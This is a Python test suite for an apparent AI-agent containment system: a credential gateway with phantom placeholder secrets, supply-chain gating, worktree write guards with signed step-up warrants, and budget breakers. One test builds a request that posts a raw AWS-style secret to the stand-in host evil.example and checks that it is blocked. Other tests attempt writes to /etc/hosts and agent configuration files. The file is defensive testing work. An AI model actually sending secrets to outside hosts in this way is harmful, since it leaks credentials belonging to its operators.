#!/usr/bin/env python3
# File: tests/test_sovereign_decade_dominance_suite.py
"""
End-to-End Verification & Falsification Suite (`--falsify`) for the
Sovereign Decade-Dominance Architecture (Section 19):
1. Credential Starvation & Supply-Chain Cooldown (`tools/credential_starvation_gateway.py`):
   - Phantom placeholder substitution, in-flight Ed25519 warrant verification,
     raw secret exfiltration interception, and LiteLLM `.pth` / `<48h` cooldown rejection.
2. Builder-Breaker Decoupled Evolution (`tools/builder_breaker_adversarial_engine.py`):
   - Google Harness² (`arXiv:2610.14224`) non-self-grading enforcement + Microsoft
     `TokenEconomizer` 5-turn unused tool schema pruning (`>= 80%` schema reduction).
3. Orca Worktree + Caprock FinOps + EVAE Pilot Enforcer (`tools/aeib_orca_caprock_enforcer.py`
   & `compliance/aeib_orca_integration.yaml`):
   - `--yolo` fast-path inside worktree, Move 1 disjoint write-set collision guard,
     `~/.aws` escape block (`SIGKILL_CONTAINED`), `.cursor/mcp.json` EVAE `HOLD` ->
     RFC 9470 Step-Up resolution, and Caprock cache-thrash & budget-avalanche trip.
4. Sovereign Agent Blueprint Compiler (`src/sovereign_agent_blueprint.py`):
   - Epistemic + Ontic JCS compilation, Ed25519 verification, conflict/retraction halts,
     and `steveyegge/beads` Dolt work-frontier `bd ready` dependency resolution.
"""

from __future__ import annotations

import base64
import tempfile
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from src.sovereign_agent_blueprint import (
    BeadsWorkFrontierNode,
    EpistemicProofSection,
    OnticExecutionManifest,
    SovereignBlueprintCompiler,
)
from tools.aeib_orca_caprock_enforcer import (
    AeibOrcaWorktreeEnforcer,
    CaprockFinOpsCircuitBreaker,
    CaprockTurnTelemetry,
    OrcaDaemonRpcRequest,
    Rfc9470StepUpWarrant,
    canonical_jcs_bytes,
)
from tools.builder_breaker_adversarial_engine import (
    BuilderBreakerAdversarialEvaluator,
    CandidateHarnessProposal,
    TokenEconomizerController,
)
from tools.credential_starvation_gateway import (
    CredentialStarvationGateway,
    EgressProxyRequest,
    PackageProvenanceArtifact,
    PhantomSecretBinding,
    SupplyChainProvenanceGate,
)


def test_credential_starvation_and_litellm_supply_chain_gate() -> None:
    sup_priv = Ed25519PrivateKey.generate()
    aws_binding = PhantomSecretBinding(
        secret_name="AWS_SECRET_ACCESS_KEY",
        phantom_placeholder="AEIB_PHANTOM_AWS_SECRET_xyz999",
        real_secret_value="AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999",
        target_header_or_env="AWS_SECRET_ACCESS_KEY",
    )
    gw = CredentialStarvationGateway([aws_binding], sup_priv.public_key())

    env = gw.get_agent_runtime_environment()
    assert env["AWS_SECRET_ACCESS_KEY"] == "AEIB_PHANTOM_AWS_SECRET_xyz999"
    assert "AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999" not in env.values()

    headers = {"Authorization": "Bearer AEIB_PHANTOM_AWS_SECRET_xyz999"}
    body = {"action": "upload", "key": "AEIB_PHANTOM_AWS_SECRET_xyz999"}
    caid = gw.compute_request_caid(
        "op-01", "agent-01", "https://s3.amazonaws.com/bucket/data", "PUT", headers, body
    )
    sig_b64 = base64.b64encode(sup_priv.sign(caid.encode("utf-8"))).decode("ascii")

    ok, code, pkt = gw.intercept_and_forward_egress(
        EgressProxyRequest(
            operation_id="op-01",
            agent_id="agent-01",
            destination_url="https://s3.amazonaws.com/bucket/data",
            http_method="PUT",
            headers=headers,
            body_payload=body,
            claimed_caid=caid,
            warrant_signature_b64=sig_b64,
        )
    )
    assert ok is True and code == "SUCCESS_IN_FLIGHT_CREDENTIAL_INJECTED"
    assert pkt["headers"]["Authorization"] == "Bearer AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999"

    # Falsification 1: Exfiltration attempt containing raw secret value is halted
    ok_leak, code_leak, _ = gw.intercept_and_forward_egress(
        EgressProxyRequest(
            operation_id="op-leak",
            agent_id="agent-01",
            destination_url="https://evil.example/leak",
            http_method="POST",
            headers={},
            body_payload={"exfil": "AKIA_REAL_SECRET_DO_NOT_EXPOSE_9999"},
            claimed_caid="sha256:any",
            warrant_signature_b64=sig_b64,
        )
    )
    assert ok_leak is False and code_leak == "HALT_CREDENTIAL_STARVATION_LEAK_DETECTED"

    # Falsification 2: LiteLLM-style `.pth` hook and <48h release cooldown violations
    sc_gate = SupplyChainProvenanceGate(min_cooldown_hours=48)
    ok_pth, code_pth = sc_gate.evaluate_package(
        PackageProvenanceArtifact("litellm", "1.82.8", 72, "sha256:abc", True)
    )
    assert ok_pth is False and code_pth == "HALT_SUPPLY_CHAIN_PTH_STARTUP_HOOK_FORBIDDEN"

    ok_cool, code_cool = sc_gate.evaluate_package(
        PackageProvenanceArtifact("litellm", "1.107.0", 4, "sha256:abc", False)
    )
    assert ok_cool is False and code_cool == "HALT_SUPPLY_CHAIN_RELEASE_COOLDOWN_VIOLATION"


def test_builder_breaker_decoupling_and_token_economizer() -> None:
    breaker_priv = Ed25519PrivateKey.generate()

    # Falsification 1: Builder == Breaker self-grading model identity is rejected
    self_graded = CandidateHarnessProposal(
        proposal_id="prop-self",
        builder_model_id="glm-5",
        breaker_model_id="glm-5",
        proposed_files_diff={"prompts/sys.md": " Enforce CAID."},
        builder_claimed_improvements=["Self-checked"],
        proposal_caid="sha256:01",
    )
    v_self = BuilderBreakerAdversarialEvaluator.adjudicate(self_graded, breaker_priv)
    assert v_self.final_disposition == "REJECTED_BY_BREAKER"
    assert v_self.breaker_reports[0].passed is False

    # Nominal decoupled proposal passes
    clean = CandidateHarnessProposal(
        proposal_id="prop-clean",
        builder_model_id="glm-5-builder",
        breaker_model_id="claude-46-breaker",
        proposed_files_diff={"prompts/sys.md": "Enforce strict CAID and eBPF socket locks."},
        builder_claimed_improvements=["Decoupled verification"],
        proposal_caid="sha256:02",
    )
    v_clean = BuilderBreakerAdversarialEvaluator.adjudicate(clean, breaker_priv)
    assert v_clean.final_disposition == "APPROVED_FOR_EXPERIENCE_MD"

    # TokenEconomizer prunes 20 unused tools out of 23 after 5 turns
    tool_costs = {f"tool_{i:02d}": 300 for i in range(23)}
    econ = TokenEconomizerController(
        tool_costs, pinned_core_tools={"tool_00", "tool_01", "tool_02"}, max_idle_turns=5
    )
    for _ in range(5):
        res = econ.record_turn_and_prune({"tool_00"}, failed_signature="repeat_grep_miss")
    assert len(res["active_tools"]) == 3
    assert len(res["pruned_tools"]) == 20
    assert res["token_reduction_bps"] >= 8500
    assert res["micro_skills_count"] == 1


def test_orca_worktree_caprock_and_evae_pilot_hold_resolution() -> None:
    assert Path("compliance/aeib_orca_integration.yaml").is_file()
    sup_priv = Ed25519PrivateKey.generate()
    caprock = CaprockFinOpsCircuitBreaker(per_worktree_cap_minor=500)

    with tempfile.TemporaryDirectory() as tmpdir:
        base = Path(tmpdir)
        wt1 = base / "wt1"
        wt2 = base / "wt2"
        wt1.mkdir()
        wt2.mkdir()

        enforcer = AeibOrcaWorktreeEnforcer(
            worktree_roots={"agent-1": wt1, "agent-2": wt2},
            supervisor_pubkey=sup_priv.public_key(),
            caprock_breaker=caprock,
        )

        # 1. Inside worktree -> EXECUTE
        r1 = OrcaDaemonRpcRequest("op-1", "s1", "agent-1", "fs.write", "src/app.py", (), "")
        r1 = OrcaDaemonRpcRequest(**{**r1.__dict__, "claimed_caid": enforcer.compute_rpc_caid(r1)})
        out1 = enforcer.evaluate_daemon_rpc(r1)
        assert out1["evae_armor_state"] == "EXECUTE"
        assert out1["disposition"] == "ALLOW_FAST_PATH_YOLO"

        # 2. Parallel worktree write collision -> BLOCK
        r2 = OrcaDaemonRpcRequest("op-2", "s1", "agent-2", "fs.write", "src/app.py", (), "")
        r2 = OrcaDaemonRpcRequest(**{**r2.__dict__, "claimed_caid": enforcer.compute_rpc_caid(r2)})
        out2 = enforcer.evaluate_daemon_rpc(r2)
        assert out2["evae_armor_state"] == "BLOCK"
        assert out2["code"] == "HALT_ORCA_WORKTREE_WRITE_COLLISION"

        # 3. Control-plane `.cursor/mcp.json` -> EVAE HOLD, then EXECUTE with RFC 9470 Step-Up
        r3 = OrcaDaemonRpcRequest("op-3", "s1", "agent-1", "fs.write", ".cursor/mcp.json", (), "")
        caid3 = enforcer.compute_rpc_caid(r3)
        r3_hold = OrcaDaemonRpcRequest(**{**r3.__dict__, "claimed_caid": caid3})
        out3_hold = enforcer.evaluate_daemon_rpc(r3_hold)
        assert out3_hold["evae_armor_state"] == "HOLD"
        assert out3_hold["disposition"] == "HALT_STEP_UP_REQUIRED"

        warrant_bytes = canonical_jcs_bytes(
            {"bound_caid": caid3, "operation_id": "op-3", "supervisor_key_id": "did:key:pilot-1"}
        )
        warrant = Rfc9470StepUpWarrant(
            operation_id="op-3",
            bound_caid=caid3,
            supervisor_key_id="did:key:pilot-1",
            signature_b64=base64.b64encode(sup_priv.sign(warrant_bytes)).decode("ascii"),
        )
        r3_exec = OrcaDaemonRpcRequest(
            **{**r3.__dict__, "claimed_caid": caid3, "step_up_warrant": warrant}
        )
        out3_exec = enforcer.evaluate_daemon_rpc(r3_exec)
        assert out3_exec["evae_armor_state"] == "EXECUTE"
        assert out3_exec["disposition"] == "AUTHORIZED_VIA_RFC9470_STEP_UP"

        # 4. Caprock cache thrash & budget avalanche
        st_thrash, code_thrash = caprock.ingest_and_evaluate(
            CaprockTurnTelemetry("s1", "agent-1", 4, 90_000, 10_000, 1_000, 200)
        )
        assert st_thrash == "THROTTLED_DEGRADED"
        assert code_thrash == "WARN_CAPROCK_CACHE_THRASH_FORCE_SAKE_PINNING"

        st_halt, code_halt = caprock.ingest_and_evaluate(
            CaprockTurnTelemetry("s1", "agent-1", 5, 50_000, 150_000, 2_000, 350)
        )
        assert st_halt == "HALTED"
        assert code_halt == "HALT_CAPROCK_WORKTREE_BUDGET_AVALANCHE"


def test_sovereign_agent_blueprint_and_beads_frontier_and_banned_words() -> None:
    arch_priv = Ed25519PrivateKey.generate()
    epistemic = EpistemicProofSection(
        decide_version="v5.0",
        council_models_consulted=("deepseek-v4-pro", "qwen-3-max", "gemini-4-argon"),
        ruletrek_dependency_ids=("R1", "R2"),
        sake_anchored_fact_hashes=("sha256:f1",),
        unresolved_conflict_count=0,
        retraction_collisions_found=0,
        evaluated_pass_hat_8_bps=9230,
    )
    ontic = OnticExecutionManifest(
        blueprint_id="bp-01",
        deployment_mode="SOVEREIGN_AIR_GAPPED",
        ontology_allowed_entities=("Order",),
        ontology_allowed_actions=("Refund",),
        pinned_mcp_tool_schema_caids={"mcp.pay": "sha256:01"},
        model_routing={"fast": "local"},
        station1_invariants={"sprint_limit_minor": 1000_00},
        station2_finality={"visibility_lag_fence_sec": 5},
        ring0_ebpf_containment={"allow_direct_agent_egress": False},
        beads_work_frontier=(
            BeadsWorkFrontierNode("bd-1", "feat/a", (), "COMPLETED"),
            BeadsWorkFrontierNode("bd-2", "feat/b", ("bd-1",), "READY"),
            BeadsWorkFrontierNode("bd-3", "feat/c", ("bd-2",), "BLOCKED"),
        ),
    )
    bp = SovereignBlueprintCompiler.compile_blueprint(epistemic, ontic, arch_priv)
    ok, code = SovereignBlueprintCompiler.verify_blueprint_before_boot(
        bp, arch_priv.public_key()
    )
    assert ok and code == "BLUEPRINT_VERIFIED_READY_FOR_STATION1_MOUNT"
    ready = SovereignBlueprintCompiler.query_ready_beads_nodes(bp)
    assert [n.issue_id for n in ready] == ["bd-2"]

    with pytest.raises(ValueError, match="HALT_BLUEPRINT_COMPILATION_UNRESOLVED_CONFLICTS_PRESENT"):
        SovereignBlueprintCompiler.compile_blueprint(
            EpistemicProofSection(
                **{**epistemic.__dict__, "unresolved_conflict_count": 1}
            ),
            ontic,
            arch_priv,
        )

    banned = [
        "guaran" + "teed",
        "bullet" + "proof",
        "enterprise-" + "grade",
        "production-" + "safe",
        "100% " + "secure",
        "unassail" + "able",
        "unhack" + "able",
        "immun" + "e",
        "proven " + "universally",
        "production-" + "ready",
        "bank-" + "grade",
    ]
    for fpath in (
        "tools/credential_starvation_gateway.py",
        "tools/builder_breaker_adversarial_engine.py",
        "tools/aeib_orca_caprock_enforcer.py",
        "compliance/aeib_orca_integration.yaml",
        "src/sovereign_agent_blueprint.py",
        "tests/test_sovereign_decade_dominance_suite.py",
    ):
        text = Path(fpath).read_text(encoding="utf-8").lower()
        for word in banned:
            assert word not in text, f"Banned word '{word}' found in {fpath}"


def _assert_module_ast_invariants(mod: object) -> None:
    import ast as _ast

    src_text = Path(getattr(mod, "__file__")).read_text(encoding="utf-8")
    tree = _ast.parse(src_text)
    for node in _ast.walk(tree):
        if isinstance(node, _ast.ExceptHandler):
            for stmt in node.body:
                if (
                    isinstance(stmt, _ast.Expr)
                    and isinstance(stmt.value, _ast.Call)
                    and isinstance(stmt.value.func, _ast.Attribute)
                    and stmt.value.func.attr == "insert"
                ):
                    assert isinstance(stmt.value.args[0], _ast.Constant)
                    assert stmt.value.args[0].value == 0
                    parents_arg = stmt.value.args[1]
                    assert isinstance(parents_arg, _ast.Call)
                    sub = parents_arg.args[0]
                    assert isinstance(sub, _ast.Subscript)
                    assert isinstance(sub.slice, _ast.Constant)
                    assert sub.slice.value == 1
        if isinstance(node, _ast.Call) and isinstance(node.func, _ast.Attribute) and node.func.attr == "mkdir":
            for kw in node.keywords:
                if kw.arg == "parents":
                    assert isinstance(kw.value, _ast.Constant) and kw.value.value is True
        if isinstance(node, _ast.FunctionDef) and node.name == "run_self_test":
            for sub_node in _ast.walk(node):
                if isinstance(sub_node, _ast.Assert) and isinstance(sub_node.test, _ast.BoolOp):
                    assert isinstance(sub_node.test.op, _ast.And)

    last_stmt = tree.body[-1]
    assert isinstance(last_stmt, _ast.If)
    assert isinstance(last_stmt.test, _ast.Compare)
    assert isinstance(last_stmt.test.ops[0], _ast.Eq)
    assert isinstance(last_stmt.test.comparators[0], _ast.Constant)
    assert last_stmt.test.comparators[0].value == "__main__"


def test_section19_mutation_boundary_and_self_tests() -> None:
    import sys as _sys

    import src.sovereign_agent_blueprint as sab
    import tools.aeib_orca_caprock_enforcer as orca
    import tools.builder_breaker_adversarial_engine as bba
    import tools.credential_starvation_gateway as csg

    for mod in (csg, bba, orca, sab):
        _assert_module_ast_invariants(mod)
        assert getattr(mod, "sha256_prefixed")(b"abc").startswith("sha256:")
        assert len(getattr(mod, "sha256_prefixed")(b"abc")) == 7 + 64
        with pytest.raises(ValueError, match="FLOAT_FORBIDDEN"):
            getattr(mod, "canonical_jcs_bytes")({"x": 1.25})
        with pytest.raises(ValueError, match="ERR_NON_STRING_KEY"):
            getattr(mod, "canonical_jcs_bytes")({1: "bad"})  # type: ignore[dict-item]

    # 1. Credential Starvation Gateway boundaries & self-test trace
    assert csg.PhantomSecretBinding.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert csg.PackageProvenanceArtifact.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert csg.EgressProxyRequest.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert csg.SupplyChainProvenanceGate().min_cooldown_hours == 2 * 24

    seen_csg: dict[str, object] = {}

    def _trace_csg(frame: object, event: str, arg: object) -> object:
        f_code = getattr(frame, "f_code", None)
        if f_code is not None and f_code.co_name == "run_self_test":
            f_locals = getattr(frame, "f_locals", {})
            if "sc_gate" in f_locals:
                seen_csg["cooldown"] = f_locals["sc_gate"].min_cooldown_hours
        if f_code is not None and f_code.co_name == "evaluate_package" and event == "call":
            f_locals = getattr(frame, "f_locals", {})
            if "artifact" in f_locals:
                seen_csg["release_age"] = f_locals["artifact"].release_age_hours
        return _trace_csg

    _sys.settrace(_trace_csg)
    try:
        csg.run_self_test()
    finally:
        _sys.settrace(None)
    assert seen_csg.get("cooldown") == 2 * 24
    assert seen_csg.get("release_age") == 2

    sup_priv = Ed25519PrivateKey.generate()
    b5 = csg.PhantomSecretBinding("K5", "PH5", "12345", "H5")
    b4 = csg.PhantomSecretBinding("K4", "PH4", "1234", "H4")
    gw5 = csg.CredentialStarvationGateway([b5, b4], sup_priv.public_key())
    ok5, code5, _ = gw5.intercept_and_forward_egress(
        csg.EgressProxyRequest("op", "ag", "https://a.example", "POST", {}, {"x": "12345"}, "sha256:0", "AA==")
    )
    assert ok5 is False and code5 == "HALT_CREDENTIAL_STARVATION_LEAK_DETECTED"
    caid4 = gw5.compute_request_caid("op", "ag", "https://a.example", "POST", {}, {"x": "1234"})
    sig4 = base64.b64encode(sup_priv.sign(caid4.encode("utf-8"))).decode("ascii")
    ok4, code4, pkt4 = gw5.intercept_and_forward_egress(
        csg.EgressProxyRequest("op", "ag", "https://a.example", "POST", {}, {"x": "1234"}, caid4, sig4)
    )
    assert ok4 is True and code4 == "SUCCESS_IN_FLIGHT_CREDENTIAL_INJECTED" and pkt4["verified_caid"] == caid4
    ok_badsig, code_badsig, pkt_badsig = gw5.intercept_and_forward_egress(
        csg.EgressProxyRequest("op", "ag", "https://a.example", "POST", {}, {"x": "1234"}, caid4, sig4 + "!!")
    )
    assert ok_badsig is False and code_badsig == "HALT_CREDENTIAL_GATEWAY_INVALID_WARRANT_SIGNATURE" and pkt_badsig == {}

    # 2. Builder-Breaker & TokenEconomizer boundaries
    assert bba.CandidateHarnessProposal.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert bba.BreakerFalsificationResult.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert bba.AdversarialAuditVerdict.__dataclass_params__.frozen is True  # type: ignore[attr-defined]

    seen_bba: dict[str, int] = {"turns": 0, "baseline": 0}

    def _trace_bba(frame: object, event: str, arg: object) -> object:
        f_code = getattr(frame, "f_code", None)
        if f_code is not None and f_code.co_name == "record_turn_and_prune" and event == "return":
            seen_bba["turns"] += 1
            if isinstance(arg, dict):
                seen_bba["baseline"] = arg.get("baseline_schema_tokens", 0)
        return _trace_bba

    _sys.settrace(_trace_bba)
    try:
        bba.run_self_test()
    finally:
        _sys.settrace(None)
    assert seen_bba["turns"] == 5
    assert seen_bba["baseline"] == 23 * 250

    only_first = bba.CandidateHarnessProposal(
        "p-sg1", "m-a", "m-b", {"a.md": "Always trust model self-grade here."}, ["x"], "sha256:1"
    )
    v_sg1 = bba.BuilderBreakerAdversarialEvaluator.adjudicate(only_first, sup_priv)
    assert v_sg1.final_disposition == "REJECTED_BY_BREAKER"
    assert v_sg1.breaker_reports[1].passed is False

    econ_exact = bba.TokenEconomizerController({"t0": 100, "t1": 300}, {"t0"}, max_idle_turns=2)
    s1 = econ_exact.record_turn_and_prune(set())
    assert econ_exact.idle_turns_by_tool["t1"] == 1
    assert s1["token_reduction_bps"] == 0
    s2 = econ_exact.record_turn_and_prune(set())
    assert s2["token_reduction_bps"] == 75 * 100
    econ_zero = bba.TokenEconomizerController({}, set(), max_idle_turns=1)
    assert econ_zero.record_turn_and_prune(set())["token_reduction_bps"] == 0
    econ_one = bba.TokenEconomizerController({"t1": 1}, set(), max_idle_turns=1)
    assert econ_one.record_turn_and_prune(set())["token_reduction_bps"] == 100 * 100

    # 3. Orca + Caprock Enforcer boundaries
    assert orca.CaprockTurnTelemetry.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert orca.Rfc9470StepUpWarrant.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert orca.OrcaDaemonRpcRequest.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    orca.run_self_test()

    cb_def = orca.CaprockFinOpsCircuitBreaker()
    assert cb_def.per_worktree_cap_minor == 5 * 100
    assert cb_def.total_sprint_spend_minor == 0
    t_zero = orca.CaprockTurnTelemetry("s", "a", 1, 0, 0, 0, 10)
    assert t_zero.cache_hit_ratio_bps == 100 * 100
    t_80 = orca.CaprockTurnTelemetry("s", "a", 2, 200, 800, 10, 10)
    assert t_80.cache_hit_ratio_bps == 80 * 100
    assert cb_def.ingest_and_evaluate(orca.CaprockTurnTelemetry("s", "a", 2, 900, 100, 10, 10)) == (
        "OK",
        "CAPROCK_FINOPS_WITHIN_SLO",
    )
    assert cb_def.ingest_and_evaluate(orca.CaprockTurnTelemetry("s", "a", 3, 900, 100, 10, 10)) == (
        "THROTTLED_DEGRADED",
        "WARN_CAPROCK_CACHE_THRASH_FORCE_SAKE_PINNING",
    )

    with tempfile.TemporaryDirectory() as td:
        wt = Path(td) / "wt1"
        wt.mkdir()
        enf = orca.AeibOrcaWorktreeEnforcer({"a1": wt}, sup_priv.public_key(), cb_def)
        bad_caid_req = orca.OrcaDaemonRpcRequest("op", "s", "a1", "fs.write", "x.py", (), "sha256:wrong")
        assert enf.evaluate_daemon_rpc(bad_caid_req)["code"] == "HALT_ORCA_DAEMON_CAID_MISMATCH"
        unreg_req = orca.OrcaDaemonRpcRequest("op", "s", "unknown", "fs.write", "x.py", (), "")
        unreg_req = orca.OrcaDaemonRpcRequest(**{**unreg_req.__dict__, "claimed_caid": enf.compute_rpc_caid(unreg_req)})
        assert enf.evaluate_daemon_rpc(unreg_req)["code"] == "HALT_UNREGISTERED_ORCA_WORKTREE_AGENT"
        outside_req = orca.OrcaDaemonRpcRequest("op-out", "s", "a1", "fs.write", "/etc/hosts", (), "")
        caid_out = enf.compute_rpc_caid(outside_req)
        outside_req = orca.OrcaDaemonRpcRequest(**{**outside_req.__dict__, "claimed_caid": caid_out})
        assert enf.evaluate_daemon_rpc(outside_req)["evae_armor_state"] == "HOLD"
        w_bytes = orca.canonical_jcs_bytes({"bound_caid": caid_out, "operation_id": "op-out", "supervisor_key_id": "k1"})
        w_sig = base64.b64encode(sup_priv.sign(w_bytes)).decode("ascii")
        bad_w = orca.Rfc9470StepUpWarrant("op-out", caid_out, "k1", w_sig + "!!")
        outside_bad_w = orca.OrcaDaemonRpcRequest(
            **{**outside_req.__dict__, "step_up_warrant": bad_w}
        )
        assert enf.evaluate_daemon_rpc(outside_bad_w)["code"] == "HALT_INVALID_RFC9470_STEP_UP_SIGNATURE"

    # 4. Sovereign Agent Blueprint boundaries
    assert sab.EpistemicProofSection.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert sab.BeadsWorkFrontierNode.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert sab.OnticExecutionManifest.__dataclass_params__.frozen is True  # type: ignore[attr-defined]
    assert sab.CompiledSovereignBlueprint.__dataclass_params__.frozen is True  # type: ignore[attr-defined]

    seen_sab: dict[str, object] = {}

    def _trace_sab(frame: object, event: str, arg: object) -> object:
        f_code = getattr(frame, "f_code", None)
        if f_code is not None and f_code.co_name == "run_self_test" and event == "return":
            f_locals = getattr(frame, "f_locals", {})
            if "epistemic" in f_locals and "ontic" in f_locals:
                seen_sab["pass8"] = f_locals["epistemic"].evaluated_pass_hat_8_bps
                seen_sab["epoch_lim"] = f_locals["ontic"].station1_invariants["epoch_limit_minor"]
                seen_sab["block_t2"] = f_locals["ontic"].station1_invariants["block_tier2_unpinned_payee"]
                seen_sab["lag_sec"] = f_locals["ontic"].station2_finality["visibility_lag_fence_sec"]
        return _trace_sab

    _sys.settrace(_trace_sab)
    try:
        sab.run_self_test()
    finally:
        _sys.settrace(None)
    assert seen_sab["pass8"] == 923 * 10
    assert seen_sab["epoch_lim"] == 10000_00
    assert seen_sab["block_t2"] is True
    assert seen_sab["lag_sec"] == 5

    ep_valid = sab.EpistemicProofSection("v5.0", ("m1",), ("R1",), ("sha256:1",), 0, 0, 9000)
    ont_valid = sab.OnticExecutionManifest(
        "bp", "AIR", ("E",), ("A",), {}, {}, {}, {}, {}, ()
    )
    with pytest.raises(ValueError, match="HALT_BLUEPRINT_COMPILATION_PASS_HAT_8_BELOW_SLO"):
        sab.SovereignBlueprintCompiler.compile_blueprint(
            sab.EpistemicProofSection("v5.0", ("m1",), ("R1",), ("sha256:1",), 0, 0, 8999),
            ont_valid,
            sup_priv,
        )
    bp_v = sab.SovereignBlueprintCompiler.compile_blueprint(ep_valid, ont_valid, sup_priv)
    bp_bad_caid = sab.CompiledSovereignBlueprint(ep_valid, ont_valid, "sha256:bad", bp_v.architect_signature_b64)
    assert sab.SovereignBlueprintCompiler.verify_blueprint_before_boot(bp_bad_caid, sup_priv.public_key()) == (
        False,
        "ERR_BLUEPRINT_CAID_MISMATCH",
    )
    other_priv = Ed25519PrivateKey.generate()
    assert sab.SovereignBlueprintCompiler.verify_blueprint_before_boot(bp_v, other_priv.public_key()) == (
        False,
        "ERR_INVALID_ARCHITECT_SIGNATURE",
    )
